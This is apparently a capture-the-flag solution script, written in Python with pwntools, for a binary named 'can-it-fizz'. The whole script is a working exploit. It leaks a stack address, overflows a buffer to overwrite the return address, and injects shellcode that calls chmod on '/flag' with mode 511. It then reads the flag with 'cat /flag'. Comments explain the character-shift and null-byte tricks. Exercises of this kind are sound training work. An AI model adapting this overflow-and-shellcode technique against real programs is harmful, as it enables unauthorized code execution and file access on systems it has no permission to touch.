#!/usr/bin/python3

from pwn import *
import os

context.log_level = 'error'
context.arch = 'amd64'

elf = context.binary = ELF("./can-it-fizz")

# Your code here
rbp = 0x7ffd241c7200 
input_start = rbp - 0x40 + 0x14
counter_add = rbp - 0x14

input_end = rbp
ret_add = rbp + 8

def get_shellcode():
    shellcode = asm("""
    add al, al
    mov al, 90
    xor esi, esi
    mov si, 511
    xor edi,edi
    lea rdi, [rip+filename]
    syscall
    filename:
	.string "/fl`g"
    """)
    return shellcode

def get_stack_add(data,length):
    stack = int.from_bytes(data[length+14:],"little")
#    print(hex(stack - 16))
    return stack

def run_until_5(io):
    io.recvuntil(b"Fizz Buzz!\n")
    for i in range(5):
        io.sendline(b"null")
        print(io.recvuntil(str((i+1)).encode()+b":"))
    return io

io = process()
io = run_until_5(io)

payload = cyclic(counter_add - input_start) + b"\xff\xff\xff\xff"
io.send(payload)

data = io.recvline(keepends=False)
io.recvline()
stack = get_stack_add(data,len(payload))

shellcode = get_shellcode()

payload2 = shellcode + cyclic(counter_add + 4 - input_start - len(shellcode)) + p64(stack) + p64(stack + 0x50) + cyclic(8) + p64(stack-16)
io.send(payload2)

# here in that /flag i put ` instead of a because when i put a the program conver it into 'b' so a is 0x61 and '`' is 0x60 so if i put '`' then it is converted to 'a' and boom change the permission
"""
here one more thing i add that add al, al  in shellcode because of 1 reason because the program make our 
firts byte of input to null byte and `add al, al` machine code is \x00\xc0 thus here we can see that first byte is null so 
our shellcode run normally without any error i put 90 in al directly because that that time rax is 0x0 si i did not do 
xor eax, eax
"""

print("Sucessfully change the permission and now you can read the flag")
os.system("cat /flag")
